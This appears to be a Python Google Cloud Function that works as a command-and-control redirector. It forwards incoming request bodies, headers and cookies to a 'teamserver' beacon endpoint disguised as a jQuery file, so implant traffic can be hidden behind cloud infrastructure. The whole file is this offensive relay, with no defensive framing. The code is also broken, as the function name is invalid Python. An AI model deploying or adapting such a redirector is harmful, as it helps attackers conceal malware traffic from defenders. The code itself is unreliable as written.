
from flask import make_response
import functions_framework
import requests

@functions_framework.http
def jquery-3.3.1.min.js(request):
    teamserver_url = 'http://teamserver.url/' # this has to end in a '/' (slash)
    beacon_endpoint = "/jquery-3.3.1.min.js"          # this is the bit after the first '/'

    post_url = teamserver_url + beacon_endpoint
    header_dict = dict(request.headers)
    cookies_dict = dict(request.cookies)
    post_data = request.get_data()

    res = requests.post(
        url=post_url,
        data=post_data,
        headers=header_dict,
        cookies=cookies_dict
    )
    response = make_response(res.content)
    return response
